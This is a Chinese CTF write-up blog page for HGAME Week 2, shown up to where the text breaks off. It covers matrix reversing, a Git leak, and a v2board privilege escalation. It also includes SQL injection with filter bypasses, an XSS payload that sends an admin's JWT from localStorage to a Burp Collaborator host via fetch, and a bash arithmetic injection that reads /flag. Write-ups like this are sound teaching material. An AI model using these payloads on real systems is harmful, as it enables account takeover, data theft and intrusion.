<!DOCTYPE html>
<html lang="en">
    <head>
  <!-- 元数据 -->
  <meta charset="utf-8">
  
  
  <title>HGAME 2022 Week2 writeup by ripple | ripple</title>
  <meta name="author" content="rippleQAQ" />
  <meta http-equiv="Cache-Control" content="no-transform" />
  <meta http-equiv="Cache-Control" content="no-siteapp" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
  <meta name="robots" content="index,follow" />
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
  <meta name="format-detection" content="telphone=no, email=no" />
  
    <meta name="keywords" content="" />
  
  <meta name="description" content="HGAME 2022 Week2 writeup by rippleREVERSEmath比较有意思的一道线性代数题（bushi 下载附件，放入IDA反汇编。 看到scanf，输入的变量我重命名了一下：  核心加密逻辑：  到这里一开始很奇怪，找不到savedreg和input之间的关系啊。 后来结合猜测与调试的验证，其实savedreg就是input。 用IDA远程连接虚拟机进行调试，具体参考了">
<meta property="og:type" content="article">
<meta property="og:title" content="HGAME 2022 Week2 writeup by ripple">
<meta property="og:url" content="https://rippleqaq.github.io/2023/02/24/HGAME-Week2/index.html">
<meta property="og:site_name" content="ripple">
<meta property="og:description" content="HGAME 2022 Week2 writeup by rippleREVERSEmath比较有意思的一道线性代数题（bushi 下载附件，放入IDA反汇编。 看到scanf，输入的变量我重命名了一下：  核心加密逻辑：  到这里一开始很奇怪，找不到savedreg和input之间的关系啊。 后来结合猜测与调试的验证，其实savedreg就是input。 用IDA远程连接虚拟机进行调试，具体参考了">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://rippleqaq.github.io/static/HGAME-Week2/scanf.png">
<meta property="og:image" content="https://rippleqaq.github.io/static/HGAME-Week2/encode.png">
<meta property="og:image" content="https://rippleqaq.github.io/static/HGAME-Week2/get_address.png">
<meta property="og:image" content="https://rippleqaq.github.io/static/HGAME-Week2/input.png">
<meta property="og:image" content="https://rippleqaq.github.io/static/HGAME-Week2/calculate.png">
<meta property="og:image" content="https://rippleqaq.github.io/static/HGAME-Week2/git.png">
<meta property="og:image" content="https://rippleqaq.github.io/static/HGAME-Week2/git_flag.png">
<meta property="og:image" content="https://rippleqaq.github.io/static/HGAME-Week2/zhuce.png">
<meta property="og:image" content="https://rippleqaq.github.io/static/HGAME-Week2/authorization.png">
<meta property="og:image" content="https://rippleqaq.github.io/static/HGAME-Week2/send.png">
<meta property="og:image" content="https://rippleqaq.github.io/static/HGAME-Week2/admin.png">
<meta property="og:image" content="https://rippleqaq.github.io/static/HGAME-Week1/admin_token.png">
<meta property="og:image" content="https://rippleqaq.github.io/static/HGAME-Week2/start.png">
<meta property="og:image" content="https://rippleqaq.github.io/static/HGAME-Week2/search.png">
<meta property="og:image" content="https://rippleqaq.github.io/static/HGAME-Week2/return.png">
<meta property="og:image" content="https://rippleqaq.github.io/static/HGAME-Week2/post.png">
<meta property="og:image" content="https://rippleqaq.github.io/static/HGAME-Week2/order.png">
<meta property="og:image" content="https://rippleqaq.github.io/static/HGAME-Week2/by.png">
<meta property="og:image" content="https://rippleqaq.github.io/static/HGAME-Week2/union.png">
<meta property="og:image" content="https://rippleqaq.github.io/static/HGAME-Week2/biao.png">
<meta property="og:image" content="https://rippleqaq.github.io/static/HGAME-Week2/sqlll.png">
<meta property="og:image" content="https://rippleqaq.github.io/static/HGAME-Week2/src.png">
<meta property="og:image" content="https://rippleqaq.github.io/static/HGAME-Week2/boxshadow.png">
<meta property="og:image" content="https://rippleqaq.github.io/static/HGAME-Week2/XSS.png">
<meta property="og:image" content="https://rippleqaq.github.io/static/HGAME-Week2/blacklist.png">
<meta property="og:image" content="https://rippleqaq.github.io/static/HGAME-Week2/alert.png">
<meta property="og:image" content="https://rippleqaq.github.io/static/HGAME-Week2/jwthere.png">
<meta property="og:image" content="https://rippleqaq.github.io/static/HGAME-Week2/usertoken.png">
<meta property="og:image" content="https://rippleqaq.github.io/static/HGAME-Week2/userreturn.png">
<meta property="og:image" content="https://rippleqaq.github.io/static/HGAME-Week2/adminreturn.png">
<meta property="og:image" content="https://rippleqaq.github.io/static/HGAME-Week2/whatadmindo.png">
<meta property="og:image" content="https://rippleqaq.github.io/static/HGAME-Week2/click.png">
<meta property="og:image" content="https://rippleqaq.github.io/static/HGAME-Week2/adminjwt.png">
<meta property="og:image" content="https://rippleqaq.github.io/static/HGAME-Week2/hint.png">
<meta property="og:image" content="https://rippleqaq.github.io/static/HGAME-Week2/gameover.png">
<meta property="og:image" content="https://rippleqaq.github.io/static/HGAME-Week2/bashgame.png">
<meta property="og:image" content="https://rippleqaq.github.io/static/HGAME-Week2/catcatflag.png">
<meta property="og:image" content="https://rippleqaq.github.io/static/HGAME-Week2/part1.png">
<meta property="og:image" content="https://rippleqaq.github.io/static/HGAME-Week2/Part5.png">
<meta property="og:image" content="https://rippleqaq.github.io/static/HGAME-Week2/pq.png">
<meta property="article:published_time" content="2023-02-23T16:00:00.000Z">
<meta property="article:modified_time" content="2023-08-02T05:05:11.180Z">
<meta property="article:author" content="rippleQAQ">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://rippleqaq.github.io/static/HGAME-Week2/scanf.png">
  
  <!-- 站点验证相关 -->
  
    
    
    
  
  <!-- 样式表文件 -->
  <link rel="stylesheet" id="kratos-css" href="/css/kratosr.min.css" media="all"></script>
  
    <link rel="stylesheet" id="darkmode-css" href="/css/kr-color-dark.min.css" media="(prefers-color-scheme: dark)"></script>
    <script src="/js/kr-dark.min.js"></script>
  
  
    <link rel="stylesheet" id="highlight-css" href="/css/highlight/night-eighties.min.css" media="all"></script>
  
  
  <link rel="stylesheet" id="fontawe-css" href="/vendors/font-awesome@4.7.0/css/font-awesome.min.css" media="all"></script>
  <link rel="stylesheet" id="nprogress-css" href="/vendors/nprogress@0.2.0/nprogress.css" media="all"></script>
  
  
    <link rel="stylesheet" href="/vendors/aplayer@1.10.1/dist/APlayer.min.css"></script>
  
  
    <link rel="stylesheet" href="/vendors/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css"></script>
  
  <!-- 不得不预先加载的一些JS文件 -->
  <script src="/vendors/jquery@3.6.0/dist/jquery.min.js"></script>
  
    <script src="/vendors/qrcode_js@1.0.0/qrcode.min.js"></script>
  
  
  <style>
    
      .kratos-cover.kratos-cover-2 {
        background-image: url('/images/banner.webp');
      }
    
    
      @media(min-width:768px) {
        body.custom-background {
          background-image: url('/images/bg.webp');
        }
      }
    
  </style>
  
<meta name="generator" content="Hexo 5.4.2"></head>


    <body class="custom-background">
        <div id="kratos-wrapper">
    <div id="kratos-page">
        <div id="kratos-header">
            <header id="kratos-desktop-topnav" class="kratos-topnav">
                <div class="container">
                    <div class="nav-header">
                        <nav id="kratos-menu-wrap">
                            <ul id="kratos-primary-menu" class="sf-menu">
                                
                                    
                                    
                                
                            </ul>
                        </nav>
                    </div>
                </div>
            </header>
            <header id="kratos-mobile-topnav" class="kratos-topnav">
                <div class="container">
                    <div class="color-logo"><a href="/">ripple</a></div>
                    <div class="nav-toggle">
                        <a class="kratos-nav-toggle js-kratos-nav-toggle">
                            <i></i>
                        </a>
                    </div>
                </div>
            </header>
        </div>
        <div class="kratos-start kratos-hero-2">
            <!-- <div class="kratos-overlay"></div> -->
            <div class="kratos-cover kratos-cover-2 text-center">
                <div class="desc desc2 animate-box">
                    <a href="/">
                        <h2>ripple</h2> <br />
                        <span></span>
                    </a>
                </div>
            </div>
        </div>

        <div id="kratos-blog-post">
            <div class="container">
                <div id="main" class="row">
                    

        

            <section class="col-md-8">

        

            <article itemscope itemtype="https://schema.org/Article">
    
    <link itemprop="mainEntityOfPage" href="https://rippleqaq.github.io/2023/02/24/HGAME-Week2/">
    <div class="kratos-hentry kratos-post-inner clearfix">
        <header class="kratos-entry-header">
            
                <h1 class="kratos-entry-title text-center" itemprop="name headline">HGAME 2022 Week2 writeup by ripple</h1>
            
            
            <ul class="kratos-post-meta text-center">
                <li><time datetime="2023-02-23T16:00:00.000Z" itemprop="datePublished"><i class="fa fa-calendar"></i> 2023-02-24</time></li>
                <li itemprop="author" itemscope itemtype="https://schema.org/Person">
                    <i class="fa fa-user"></i> 作者 <span itemprop="name">rippleQAQ</span>
                </li>
                <li>
                    <i class="fa fa-edit"></i> 
                    
                    
                        ~13.04K
                    
                    字
                </li>
                
            </ul>
        </header>
        <div class="kratos-post-content">
            
            <div id="expire-alert" class="alert alert-warning hidden" role="alert">
                <div class="icon"><i class="fa fa-warning"></i></div>
                <div class="text"><p>本文最后编辑于 <time datetime="1690952711180"></time> 前，其中的内容可能需要更新。</p></div>
            </div>
            
            
            
                <div class="kratos-post-inner-toc toc-div-class" >
                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#HGAME-2022-Week2-writeup-by-ripple"><span class="toc-number">1.</span> <span class="toc-text">HGAME 2022 Week2 writeup by ripple</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#REVERSE"><span class="toc-number">1.1.</span> <span class="toc-text">REVERSE</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#math"><span class="toc-number">1.1.1.</span> <span class="toc-text">math</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WEB"><span class="toc-number">1.2.</span> <span class="toc-text">WEB</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Git-Leakage"><span class="toc-number">1.2.1.</span> <span class="toc-text">Git Leakage</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#v2board"><span class="toc-number">1.2.2.</span> <span class="toc-text">v2board</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Commodity"><span class="toc-number">1.2.3.</span> <span class="toc-text">Commodity</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Designer"><span class="toc-number">1.2.4.</span> <span class="toc-text">Designer</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MISC"><span class="toc-number">1.3.</span> <span class="toc-text">MISC</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Tetris-Master-Revenge"><span class="toc-number">1.3.1.</span> <span class="toc-text">Tetris Master Revenge</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Tetris-Master"><span class="toc-number">1.3.2.</span> <span class="toc-text">Tetris Master</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Sign-In-Pro-Max"><span class="toc-number">1.3.3.</span> <span class="toc-text">Sign In Pro Max</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CRYPTO"><span class="toc-number">1.4.</span> <span class="toc-text">CRYPTO</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Rabin"><span class="toc-number">1.4.1.</span> <span class="toc-text">Rabin</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#RSA-%E5%A4%A7%E5%86%92%E9%99%A91"><span class="toc-number">1.4.2.</span> <span class="toc-text">RSA 大冒险1</span></a></li></ol></li></ol></li></ol>
                </div>
            
            <hr />
            <div itemprop="articleBody"><h1 id="HGAME-2022-Week2-writeup-by-ripple"><a href="#HGAME-2022-Week2-writeup-by-ripple" class="headerlink" title="HGAME 2022 Week2 writeup by ripple"></a>HGAME 2022 Week2 writeup by ripple</h1><h2 id="REVERSE"><a href="#REVERSE" class="headerlink" title="REVERSE"></a>REVERSE</h2><h3 id="math"><a href="#math" class="headerlink" title="math"></a>math</h3><p>比较有意思的一道线性代数题（bushi</p>
<p>下载附件，放入IDA反汇编。</p>
<p>看到scanf，输入的变量我重命名了一下：</p>
<p><img src="/static/HGAME-Week2/scanf.png"></p>
<p>核心加密逻辑：</p>
<p><img src="/static/HGAME-Week2/encode.png"></p>
<p>到这里一开始很奇怪，找不到savedreg和input之间的关系啊。</p>
<p>后来结合猜测与调试的验证，其实<strong>savedreg就是input</strong>。</p>
<p>用IDA远程连接虚拟机进行调试，具体参考了<a target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-247830.htm">IDA动态调试ELF-软件逆向</a>。</p>
<p>打断点后先随便输入了一下hgame{123123131312}</p>
<p>然后开始调试，找到savedreg的地址0x00007FFEA552F590，结合加密函数逻辑，减去0x170得到新地址：0x7ffea552f420</p>
<p><img src="/static/HGAME-Week2/get_address.png"></p>
<p>找到新地址的位置：0x7ffea552f420</p>
<p><img src="/static/HGAME-Week2/input.png"></p>
<p>发现正是我们input所在的位置！</p>
<p>所以大胆猜测savedreg就是input。</p>
<p>后面的判断是v11要等于v12。</p>
<p>看加密过程，很像（就是）矩阵乘法啊！照应标题。</p>
<p>下面简单推导，<strong>v12、input、v10均为五阶矩阵</strong>。</p>
<p><strong>v12</strong> = <strong>input</strong> × <strong>v10</strong></p>
<p> <strong>input</strong> =<strong>v12</strong>  × <strong>v10^(-1)</strong></p>
<p>input就是我们的flag。</p>
<p>后面就是解密了，我是采用了一个在线算矩阵的网站：<a target="_blank" rel="noopener" href="https://matrix.reshish.com/zh/inverse.php">矩阵计算器</a></p>
<p>最后的结果是：</p>
<p><img src="/static/HGAME-Week2/calculate.png"></p>
<p>但显然存在精度的问题，所以用python代码进行了矫正，代码如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">flag=[]</span><br><span class="line">true_flag=<span class="string">&quot;&quot;</span></span><br><span class="line">flag.append(<span class="number">99841149563879870</span>/<span class="number">960011053498845</span>)</span><br><span class="line">flag.append(<span class="number">872914402921897000</span>/<span class="number">8474897115746563</span>)</span><br><span class="line">flag.append(<span class="number">269740084762122240</span>/<span class="number">2780825616104341</span>)</span><br><span class="line">flag.append(<span class="number">38725573460717310</span>/<span class="number">355280490465297</span>)</span><br><span class="line">flag.append(<span class="number">593638495818870800</span>/<span class="number">5877608869493773</span>)</span><br><span class="line">flag.append(<span class="number">671587732613285800</span>/<span class="number">5460062866774681</span>)</span><br><span class="line">flag.append(<span class="number">384548456626999800</span>/<span class="number">3178086418404961</span>)</span><br><span class="line">flag.append(<span class="number">355945678861361150</span>/<span class="number">7415534976278243</span>)</span><br><span class="line">flag.append(<span class="number">475060770107883500</span>/<span class="number">4060348462460537</span>)</span><br><span class="line">flag.append(<span class="number">155373312724008960</span>/<span class="number">1362923795824643</span>)</span><br><span class="line">flag.append(<span class="number">518705972343594500</span>/<span class="number">5460062866774681</span>)</span><br><span class="line">flag.append(<span class="number">923763785616372700</span>/<span class="number">8474897115746563</span>)</span><br><span class="line">flag.append(<span class="number">177972839430677500</span>/<span class="number">2780825616104341</span>)</span><br><span class="line">flag.append(<span class="number">706500632468136000</span>/<span class="number">6090522693690805</span>)</span><br><span class="line">flag.append(<span class="number">611271322427353100</span>/<span class="number">5877608869493773</span>)</span><br><span class="line">flag.append(<span class="number">518705972343594400</span>/<span class="number">5460062866774681</span>)</span><br><span class="line">flag.append(<span class="number">415269958671582200</span>/<span class="number">8474897115746563</span>)</span><br><span class="line">flag.append(<span class="number">319794945852000260</span>/<span class="number">2780825616104341</span>)</span><br><span class="line">flag.append(<span class="number">65325767601683970</span>/<span class="number">687639658965091</span>)</span><br><span class="line">flag.append(<span class="number">605393713557856300</span>/<span class="number">5877608869493773</span>)</span><br><span class="line">flag.append(<span class="number">530886112584861200</span>/<span class="number">6720077374491915</span>)</span><br><span class="line">flag.append(<span class="number">355945678861355000</span>/<span class="number">7415534976278243</span>)</span><br><span class="line">flag.append(<span class="number">278082561610434560</span>/<span class="number">2780825616104341</span>)</span><br><span class="line">flag.append(<span class="number">888201226163243000</span>/<span class="number">7105609809305939</span>)</span><br><span class="line">flag.append(<span class="number">2048</span>/<span class="number">5877608869493773</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> flag:</span><br><span class="line">    true_flag+=<span class="built_in">chr</span>(<span class="built_in">int</span>(<span class="built_in">round</span>(i,<span class="number">0</span>)))</span><br><span class="line"><span class="built_in">print</span>(true_flag)</span><br></pre></td></tr></table></figure>

<p>得到flag:<strong>hgame{y0ur_m@th_1s_gO0d}</strong></p>
<h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="Git-Leakage"><a href="#Git-Leakage" class="headerlink" title="Git Leakage"></a>Git Leakage</h3><p>由题目不难猜出是一个git泄露的题</p>
<p>访问/.git发现确实有git泄露</p>
<p><img src="/static/HGAME-Week2/git.png"></p>
<p>使用GitHack-master</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GitHack.py http://week-2.hgame.lwsec.cn:32003/.git/</span><br></pre></td></tr></table></figure>

<p>得到一个Th1s_1s-flag文件。</p>
<p><img src="/static/HGAME-Week2/git_flag.png"></p>
<p>16进制编译器打开得到flag:<strong>hgame{Don’t^put*Git-in_web_directory}</strong></p>
<h3 id="v2board"><a href="#v2board" class="headerlink" title="v2board"></a>v2board</h3><p>顺着搜索v2board我们可以发现v2board1.6.1版本存在提权漏洞。</p>
<p>这个漏洞还是比较新的，复现难度也不高，太恐怖啦！尤其是自己复现一遍之后，真切感受到了网络安全的重要啊。</p>
<p>复现思路参考网站：<a target="_blank" rel="noopener" href="https://www.ctfiot.com/88960.html">v2board越权漏洞复现</a></p>
<p>先注册一个普通用户的账号</p>
<p><img src="/static/HGAME-Week2/zhuce.png"></p>
<p>然后登陆，登陆后使用F12可以查看到返回头里的authorization</p>
<p><img src="/static/HGAME-Week2/authorization.png"></p>
<p>记录下authorization的值，退出登录，打开burpsuite开启拦截。</p>
<p>输入账号密码登录，burpsuite拦截到请求头。</p>
<p>向请求头里加入authorization头发送</p>
<p>这一步的目的是让服务器将普通用户的Authorization头写入缓存中。</p>
<p><img src="/static/HGAME-Week2/send.png"></p>
<p>关闭拦截，成功登录。</p>
<p>最后只要带上这个Authorization头即可访问所有的管理员接口。</p>
<p>开启拦截，带上Authorization头访问/api/v1/admin/user/fetch后关闭拦截。</p>
<p><img src="/static/HGAME-Week2/admin.png"></p>
<p>进入到/api/v1/admin/user/fetch即可找到admin的token:39d580e71705f6abac9a414def74c466</p>
<p><img src="/static/HGAME-Week1/admin_token.png"></p>
<p>用hgame包裹即是flag:<strong>hgame{39d580e71705f6abac9a414def74c466}</strong></p>
<h3 id="Commodity"><a href="#Commodity" class="headerlink" title="Commodity"></a>Commodity</h3><p><img src="/static/HGAME-Week2/start.png"></p>
<p>一开始是这样一个登录的界面。</p>
<p>题目的描述里面有提示：面板登陆<strong>用户名是user01</strong>,密码……忘了，反正是个<strong>比较好猜的密码</strong>，我记得它是<strong>8位数的，有字母也有数字</strong></p>
<p>可见是一个8位弱密码的爆破。</p>
<p>这里可以在网上找一些字典来爆破，也可以直接试一些常见的8位弱密码。</p>
<p>我这里是查了一下然后试出来了，密码是<strong>admin123</strong>。</p>
<p>登录后进入这样一个界面：</p>
<p><img src="/static/HGAME-Week2/search.png"></p>
<p>输入1~8可以查看对应的一些商品：</p>
<p><img src="/static/HGAME-Week2/return.png"></p>
<p>猜测是SQL注入。</p>
<p>使用burpsuite发现是用POST方法传参，参数名是search_id。</p>
<p><img src="/static/HGAME-Week2/post.png"></p>
<p>后面为了方便F12使用hackbar来进行POST传参。</p>
<p>首先判断后端闭合方式：</p>
<p>输入1%23返回hard disk    1    </p>
<p>输入’1’%23返回hard disk    1    </p>
<p>输入1’%23返回报错</p>
<p>输入1’)%23返回报错</p>
<p>判断后端闭合符为数字型。</p>
<p>后端有一些字符被过滤了，测试过程就不一一说明了，下面是我payload里采用绕过方法：</p>
<p><strong>or and from where：双写绕过</strong></p>
<p><strong>database() select union :大写绕过</strong></p>
<p>*<em>空格：/<em>1*/绕过</em></em></p>
<p><strong>= : like绕过</strong></p>
<p>有些既可以双写也可以大写绕过就不细说了。</p>
<p>采用的是联合注入:</p>
<p><strong>第一步：判断查询结果有多少列</strong></p>
<p>1/*1*/oorrder/*1*/by/*1*/3 :正常回显（order里包含了or，采用双写绕过）</p>
<p><img src="/static/HGAME-Week2/order.png"></p>
<p>1/*1*/oorrder/*1*/by/*1*/4 :错误回显</p>
<p><img src="/static/HGAME-Week2/by.png"></p>
<p>说明有三列。</p>
<p><strong>第二步：显示数据库名</strong></p>
<p>-1/*1*/Union/*1*/Select/*1*/1,Database(),3</p>
<p><img src="/static/HGAME-Week2/union.png"></p>
<p><strong>第三步：显示se4rch数据库中的表名</strong></p>
<p>-1/*1*/Union/*1*/Select/*1*/1,(Select/*1*/group_concat(table_name)/*1*/frfromom/*1*/infoorrmation_schema.tables/*1*/whwhereere/*1*/table_schema/*1*/like/*1*/‘se4rch’),3</p>
<p><img src="/static/HGAME-Week2/biao.png"></p>
<p><strong>第四步：显示5ecret15here数据表中的列名</strong></p>
<p>-1/*1*/Union/*1*/Select/*1*/1,(Select/*1*/group_concat(column_name)/*1*/frfromom/*1*/infoorrmation_schema.columns/*1*/whwhereere/*1*/table_schema/*1*/like/*1*/‘se4rch’/*1*/anandd/*1*/table_name/*1*/like/*1*/‘5ecret15here’),3</p>
<p><strong>第五步：显示5ecret15here数据表中的f14gggg1shere</strong></p>
<p>-1/*1*/Union/*1*/Select/*1*/1,(Select/*1*/f14gggg1shere/*1*/frfromom/*1*/5ecret15here),3</p>
<p><img src="/static/HGAME-Week2/sqlll.png"></p>
<p>flag:<strong>hgame{4_M4n_WH0_Kn0ws_We4k-P4ssW0rd_And_SQL!}</strong></p>
<p>从零开始的SQL注入生活，折磨一天多终于出了！QAQ</p>
<h3 id="Designer"><a href="#Designer" class="headerlink" title="Designer"></a>Designer</h3><p> 下载附件是网站的源代码，查看</p>
<p><img src="/static/HGAME-Week2/src.png"></p>
<p>我们可以看到真正的flag被藏在admin用户的jwt里面，因此这道题目的就是窃取到admin用户的jwt。</p>
<p>打开网站随便输入一个用户名注册先看看有什么漏洞。</p>
<p><img src="/static/HGAME-Week2/boxshadow.png"></p>
<p>在不同输入框里输入后preview我们会发现在Box shadow一栏里存在<strong>XSS注入漏洞</strong></p>
<p><img src="/static/HGAME-Week2/XSS.png"></p>
<p>如图，我们的输入被嵌在了style中。</p>
<p>再次查看源代码，发现过滤名单：</p>
<p><img src="/static/HGAME-Week2/blacklist.png"></p>
<p>这里是直接把输入清空了，所以不能双写绕过，大小写试了试也不行，找了很多方法，最后采用的是<strong>unicode转码绕过</strong>。（<a target="_blank" rel="noopener" href="http://www.msxindl.com/tools/unicode16.asp">在线转unicode网站</a>）</p>
<p>同时找到让前后闭合的方式 ： 3px 3px #000;”/a&gt;  &lt;a”</p>
<p>最后点preview，发现这样可以成功弹窗：</p>
<p><strong>3px 3px #000;”/a&gt;&lt;script&gt;\u0061lert(“XSS-test”);&lt;/script&gt;&lt;a”</strong></p>
<p><img src="/static/HGAME-Week2/alert.png"></p>
<p>再去源代码看看存jwt的字段是什么：</p>
<p><img src="/static/HGAME-Week2/jwthere.png"></p>
<p>是叫token</p>
<p>localStorage被过滤，我们可以用unicode绕过：</p>
<p><strong>3px 3px #000;”/a&gt;&lt;script&gt;\u0061lert(\u006cocalStorage.getItem(‘token’));&lt;/script&gt;&lt;a”</strong></p>
<p>点preview测试一下。</p>
<p>成功弹出了自己的token。</p>
<p><img src="/static/HGAME-Week2/usertoken.png"></p>
<p>这里我们的token里面有一个假的flag。</p>
<p>接下来就是要想办法让admin在浏览我们的按钮时把自己的token发过来。</p>
<p>用到了Burpsuite的Burp Collaborator client。</p>
<p>由于fetch被过滤，转码了一下</p>
<p>一开始我用的payload是：</p>
<p><strong>3px 3px #000;”/a&gt;&lt;script&gt;\u0066etch(‘<a target="_blank" rel="noopener" href="https://4injdqamr55icfqpn5da88kutlzbn0.burpcollaborator.net&/#39;,{method:&#39;post&#39;,body:\u006cocalStorage.getItem(&#39;token&#39;)});\">https://4injdqamr55icfqpn5da88kutlzbn0.burpcollaborator.net&#39;,{method:&#39;post&#39;,body:\u006cocalStorage.getItem(&#39;token&#39;)});\</a></script>&lt;a”</strong></p>
<p>结果发现存在问题，就是自己preview的时候，能收到自己的token，但是点share时,admin发看来的头里没有带token。</p>
<p><img src="/static/HGAME-Week2/userreturn.png"></p>
<p>下面是admin的返回，无token:</p>
<p><img src="/static/HGAME-Week2/adminreturn.png"></p>
<p>后来才知道是自己没看源码，我们要先知道admin在访问链接时做了什么，才能找到正确的方法。</p>
<p>在源代码中找到我们点share后发生的事：</p>
<p><img src="/static/HGAME-Week2/whatadmindo.png"></p>
<p>可以看到admin是先访问了 <a target="_blank" rel="noopener" href="http://127.0.0.1:9090/button/preview">http://127.0.0.1:9090/button/preview</a> 这一个有我们恶意代码的页面，再登录，后面进行了一次点击。</p>
<p>而我们的注入在第一步渲染按钮页面时就已经生效，这时候admin还没登录，不带有token，自然返回里没有token咯。</p>
<p>由此，我们的一种思路是在admin点按钮时去执行恶意代码，正好可以添加一个”href”的属性。</p>
<p>最终payload:</p>
<p><strong>3px 3px #000;”href=”javascript:\u0066etch(‘<a target="_blank" rel="noopener" href="https://1moghnejv29fgcumr2h7c5orxi3arz.burpcollaborator.net&/#39;,{method:&#39;post&#39;,body:\u006cocalStorage.getItem(&#39;token&#39;)})&quot;a=&quot;">https://1moghnejv29fgcumr2h7c5orxi3arz.burpcollaborator.net&#39;,{method:&#39;post&#39;,body:\u006cocalStorage.getItem(&#39;token&#39;)})&quot;a=&quot;</a></strong></p>
<p>preview测试时就是一点击就会返回。</p>
<p>然后share给admin点点。</p>
<p><img src="/static/HGAME-Week2/click.png"></p>
<p>成功返回admin的token</p>
<p>最后去<a target="_blank" rel="noopener" href="https://www.box3.cn/tools/jwt.html">在线网站</a>解析一下：</p>
<p><img src="/static/HGAME-Week2/adminjwt.png"></p>
<p>得到真正的flag:<strong>hgame{b_c4re_ab0ut_prop3rt1ty_injEctiOn}</strong></p>
<p>还有一种思路是csrf(客户端请求伪造），也值得一试。</p>
<h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="Tetris-Master-Revenge"><a href="#Tetris-Master-Revenge" class="headerlink" title="Tetris Master Revenge"></a>Tetris Master Revenge</h3><p>Tetris Master由于存在非预期解，修正后降了分数改为Tetris Master Revenge，所以这题的方法也可以兼容Tetris Master，在Tetris Master题解中展示非预期解。</p>
<p>根据提示：调小终端字体大小后用 ssh <a href="mailto:&#99;&#116;&#x66;&#64;&#x77;&#x65;&#101;&#107;&#45;&#x32;&#46;&#x68;&#103;&#x61;&#x6d;&#101;&#46;&#x6c;&#119;&#115;&#101;&#99;&#46;&#x63;&#110;">&#99;&#116;&#x66;&#64;&#x77;&#x65;&#101;&#107;&#45;&#x32;&#46;&#x68;&#103;&#x61;&#x6d;&#101;&#46;&#x6c;&#119;&#115;&#101;&#99;&#46;&#x63;&#110;</a> -p 端口号 连接，密码为hgame</p>
<p>下载附件得到源码，查看源码后找到提示：</p>
<p><img src="/static/HGAME-Week2/hint.png"></p>
<p>看来是要在这里输入一些东西让利用master执行我们想要的代码。</p>
<p>在paint_game_over()函数中找到关键：</p>
<p><img src="/static/HGAME-Week2/gameover.png"></p>
<p><strong>if [[ “$master” -eq “y” ]] &amp;&amp; [[ “$score” -gt 50000 ]]; then</strong></p>
<p><strong>elif [[ “$master” -ne “y” ]] &amp;&amp; [[ “$score” -gt “$target” ]]; then</strong></p>
<p>这是条件表达式，可以发现如果输入y后获得50000分理论也可取得flag，但并不推荐这样做。</p>
<p>条件表达式中由于使用了[[和gt，使其仍然能够加载表达式。</p>
<p>于是我们可以在询问Are you tetris master?[y/n]后输入：</p>
<p>x[$(cat /flag)]</p>
<p>Please input your target score:时随便输入一下。</p>
<p>然后快速输掉游戏就可以得到flag了！</p>
<p><img src="/static/HGAME-Week2/bashgame.png"></p>
<p>flag:<strong>hgame{Bash_Game^Also*Can#Rce^reVenge!!!!}</strong></p>
<h3 id="Tetris-Master"><a href="#Tetris-Master" class="headerlink" title="Tetris Master"></a>Tetris Master</h3><p>用Tetris Master Revenge的方法也能解，下面展示非预期：</p>
<p>在询问Are you tetris master?[y/n]时直接ctrl+C退出</p>
<p>发现ssh连接还未断开。</p>
<p>再cat flag就行了</p>
<p><img src="/static/HGAME-Week2/catcatflag.png"></p>
<p>flag:<strong>hgame{Bash_Game^Also*Can#Rce}</strong></p>
<h3 id="Sign-In-Pro-Max"><a href="#Sign-In-Pro-Max" class="headerlink" title="Sign In Pro Max"></a>Sign In Pro Max</h3><p>超级签到题</p>
<p>下载附件signin.txt：</p>
